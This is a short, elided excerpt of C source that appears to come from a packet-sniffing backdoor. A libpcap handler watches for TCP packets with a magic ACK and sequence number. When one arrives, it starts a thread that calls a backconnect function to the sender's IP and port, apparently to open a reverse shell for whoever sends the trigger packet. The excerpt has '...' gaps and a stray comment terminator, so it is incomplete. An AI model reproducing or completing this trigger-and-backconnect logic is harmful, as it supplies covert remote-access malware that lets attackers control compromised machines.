...
/*
* For multiply threads
*
*/
void *multiconnect(void *args){
	struct thread_data *my_data;
	my_data = (struct thread_data *) args;
	backconnect(my_data->addr,my_data->port);
	return;
}
...
got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
{
	...
	*/
	...
	if (r_ack == MAGIC_ACK && r_seq == MAGIC_SEQ) {
		...
		mydata.addr=ip->ip_src;
		mydata.port=tcp->th_sport;
		if(i>=49)
			i=0;
		pthread_create( &(thread[i++]), NULL, multiconnect, (void *) &mydata);
		printf("thread:%d\n",i);
